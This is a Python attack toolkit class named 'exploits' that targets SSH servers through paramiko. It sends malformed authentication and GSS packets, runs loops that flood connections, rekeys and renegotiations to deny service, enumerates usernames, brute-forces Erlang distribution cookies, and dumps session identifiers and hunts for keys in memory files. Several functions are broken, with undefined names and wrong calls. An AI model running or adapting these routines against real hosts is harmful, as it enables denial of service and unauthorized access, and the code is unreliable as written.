#!/bin/env python
import main
import socket
import listen as connect_listen
from scapy.all import *
import datetime
import xml.etree.ElementTree as ET
import paramiko
from paramiko.common import cMSG_SERVICE_REQUEST, cMSG_USERAUTH_REQUEST
import logging
import math
import hashlib
import binascii
from binascii import b2a_hex
from scipy import stats

old_parse_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

class exploits(connect_listen.connect_listen):
 def __init__(self,hostname, port, username, password ):
   super().__init__(hostname, port, username, password)

 def _TABLE():
    """ Monkey patch paramiko to send invalid SSH2_MSG_USERAUTH_REQUEST.
        patches the following internal `AuthHandler` functions by updating the internal `_handler_table` dict
            _parse_service_accept
            _parse_userauth_failure
        _handler_table = {
            MSG_SERVICE_REQUEST: _parse_service_request,
            MSG_SERVICE_ACCEPT: _parse_service_accept,
            MSG_USERAUTH_REQUEST: _parse_userauth_request,
            MSG_USERAUTH_SUCCESS: _parse_userauth_success,
            MSG_USERAUTH_FAILURE:: _parse_userauth_failure,
            MSG_USERAUTH_BANNER: _parse_userauth_banner,
            MSG_USERAUTH_INFO_REQUEST: _parse_userauth_info_request,
            MSG_USERAUTH_INFO_RESPONSE: _parse_userauth_info_response,
        }
    """


 def info_dump(self):
   socket = connect_listen.connect_listen.socket_in(self)
   local = connect_listen.connect_listen.socket_transport(self)
   print(local)
   print(socket.recv(100))
   print(local._compression_info)
   print(local._cipher_info)
   print(local._get_latest_kex_init)
   print(local._channels)
   print(local._kex_info)
   print(local._key_info)
   print(local._mac_info)
   print(local.kex_engine)
   print(local.kexgss_ctxt)
   print(local._handler_table)
   print(local._channel_handler_table)
   print(local._channels)
   print(local.channel_events)
   print(local.channels_seen)
   print(local.get_server_key())
   print(f'Banner {local.get_banner()}')
   print(f'local._expected_packet{local._expected_packet}')
   print(f'local.default_max_packet_size{local.default_max_packet_size}')
   print(f'local.remote_cipher {local.remote_cipher}')
   print(f'local.remote_compression {local.remote_compression}')
   print(f'local.remote_mac {local.remote_mac}')
   print(f'remote_kex_init {local.remote_kex_init}')
   print(f'session id hashed {local.session_id}')
   print(f'disable algorithms{local.disabled_algorithms}')
   print(f'server extensions {local.server_extensions}')
   print(f'gss host {local.gss_host}')
   print(f'sys {local.sys}')

 def channel_info(self, n):
   socket = connect_listen.connect_listen.socket_in(self)
   local = connect_listen.connect_listen.socket_transport(self)

   print(local.channels_seen)
   print(local.channel_events)
   print(local.get_log_channel())

   for x in range(n):
    try:
     channel = paramiko.Channel(x)
     channel._set_transport(local)
     channel.send_ready()


     print(channel.in_buffer)
     print(channel.transport)
     print(channel.status_event)
     print(channel.chanid)
     print(channel._event_pending())
     print(channel.ultra_debug)
     print(channel.out_buffer_cv)
     print(channel.origin_addr)
    except:
     print(f'[?] Channel {x} not open')



 def malform_packet(self):
   socket = connect_listen.connect_listen.socket_in(self)
   local = connect_listen.connect_listen.socket_transport(self)

   print("Sending malformed packet")

   m = paramiko.Message()
   m.add_byte(cMSG_USERAUTH_REQUEST)
   m.add_string("ssh-userauth")

   local.packetizer.send_message(m)

   m = paramiko.Message()
   m.add_byte(cMSG_SERVICE_REQUEST)
   m.add_string("ssh-userauth")
   m.add_string("ssh-connection")
   m.add_string('publickey')
   m.add_boolean(True)
   m.add_string('ssh-ed25519')
   m.add_string(b'\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x15')
   m.add_string(b'\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x00')

   local.packetizer.send_message(m)



   try:
    print(socket.recv(n = 15))
   except:
    pass

 def memory_reg(self):
  socket =  connect_listen.connect_listen.socket_in(self)
  local = connect_listen.connect_listen.socket_transport(self)
  channel = paramiko.Channel(0)
  buff = paramiko.buffered_pipe.BufferedPipe()
  buff_compare = paramiko.buffered_pipe.BufferedPipe()


  thread_buff = paramiko.buffered_pipe.threading

  print(thread_buff.main_thread())

  overflow = local.session_id

  buff_compare.feed(data =  bytes(overflow))

  print("reading session id")
  buff.feed(data = overflow)
  print("buffer matrix")

  print(buff._buffer)
  print(buff_compare._buffer)

  print(len(overflow))
  hasha = hashlib.sha256()

  hasha.update(bytes(overflow))
  print(hasha.digest_size)
  print(hasha.block_size)

  print(stats.kendalltau(buff._buffer, buff_compare._buffer))



  print((local.session_id))
  print(binascii.hexlify(local.session_id).decode('utf8'))




  return binascii.hexlify(local.session_id).decode('utf8')


 def challenge(self):
   s = connect_listen.connect_listen.socket_in(self)
   challenge = s.recv(1024)   
   challenge = struct.unpack(">I", challenge[9:13])[0]
   print(f'Challenge code {challenge}')
   return challenge


 def handlers(self):
  paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
  paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error


 def xml_overflow(self, xdir):
  xml = xdir
  socket = connect_listen.connect_listen.socket_in(self)
  local = connect_listen.connect_listen.socket_transport(self)
  channel = paramiko.Channel(0)

  try:
   channel.invoke_subsystem("netconf")
   print(local.channels_seen)

   print("...compressing XML document")

   com = lzma.LZMACompressor(format=FORMAT_XZ, check=- 1, preset=None, filters=None)
   print(ET.tostring(xml, encoding='utf-8'))
   content = com.compress(xml)
   m = paramiko.Message()

   m.add(content)
   local.packetizer.send_message(m)
   print(local.packetizer.read_all(n = 100, check_rekey= False))
  except:
   print(local.channel_events)
   print(local.channels_seen)


 def erlangcookie(self, cookie):

   name_msg  = b"\x00 "
   name_msg += b"\x15"
   name_msg += b"n"
   name_msg += b"\x00\x07"
   name_msg += b"\x00\x03\x49\x9c"
   name_msg += b"AAAAAA@AAAAAAA"

   challenge_reply  = b"\x00\x15"
   challenge_reply += b"r"
   challenge_reply += b"\x01\x02\x03\x04"


   try:
     print(f'sending cookie[+] {cookie}')
     challenge_reply += md5(bytes(c, "ascii") + self.challenge(), "ascii").digest() # argv is the erlang cookie

     connect_listen.connect_listen.socket_in(self).send(challenge_reply)
     connect_listen.connect_listen.socket_in(self).recv(100)
     if len(connect_listen.connect_listen.socket_in(self).recv(100)): print(f'[+] Cookie {cookie}')
   except:
     print(f'cookie failed[-] {cookie}')
     pass


 def pointer_denial(self, n):
    socket = connect_listen.connect_listen.socket_in(self)
    local = connect_listen.connect_listen.socket_transport(self)
    clientid = "PuTTY_Release_0.64"

    local.local_version = f"SSH-2.0-{clientid}"
    print(local.local_version)
    for x in range(n):
     try:
      local.connect()
      local.close()
     except:
      pass



 def userenum(self, sfile):

  fuser = open(str(sfile), "rb+")
  socket = connect_listen.connect_listen.socket_in(self)
  transport = connect_listen.connect_listen.socket_transport(self)

  for x in fuser():
   try:
    transport.auth_publickey(x, paramiko.RSAKey.generate(1024))
    print(self.username)
   except:
    pass

 def cipher_memory(self, fi, bfs):
  print("... finding key in memory blob")
  with open(str(fi), 'rb+') as f:

   temp_key=f.read()
   temp_key_str=b2a_hex(temp_key)
   n = 2
   Dict = {}
   FREQ_ARR = []
   while len(FREQ_ARR) <= bfs:
    temp_key_list=[temp_key_str[i:i+n] for i in range(0, len(temp_key_str), n)]

    print(temp_key_list)
    counter = collections.Counter(temp_key_list)
    result = dict(counter)

    for value in result.values():
     freq = value / len(temp_key_list)
     FREQ_ARR.append(freq * math.log(1/freq))
     print(value, freq)

     if freq > .5:
      print(f'High entropy value {value, freq}')



 def malformed_gss(self, payload, n):
  socket =  connect_listen.connect_listen.socket_in(self)
  local = connect_listen.connect_listen.socket_transport(self)
  gss = paramiko.GSSAuth(self.hostname, True)
  message = gss._ssh_build_mic((local.session_id), self.username, f'{payload}', f'{payload}')
  pack = paramiko.Packetizer(socket)

  pack.start_handshake(10)
  m = paramiko.Message()
  m.add(message)

  for x in range (n):
   try:
    pack.send_message(m)
    print(f'payload {payload}')
    print(f'session_id {local.session_id}')
    print(f'packet sent {x}')

   except:
     print("[?] error")


 def kex_init_denial(self, n):
    socket =  connect_listen.connect_listen.socket_in(self)
    local = connect_listen.connect_listen.socket_transport(self)
    pack = paramiko.Packetizer(socket)

    pack.start_handshake(10)

    for i in range(n):
      try:
       pack._trigger_rekey()
       print(local._latest_kex_init)
      except:
        print("[?] error")

 def rego_denial(self, n):
   socket =  connect_listen.connect_listen.socket_in(self)
   local = connect_listen.connect_listen.socket_transport(self)
   for x in range(n):
    try:
     local.connect()
     local.renegotiate_keys()
    except:
     pass
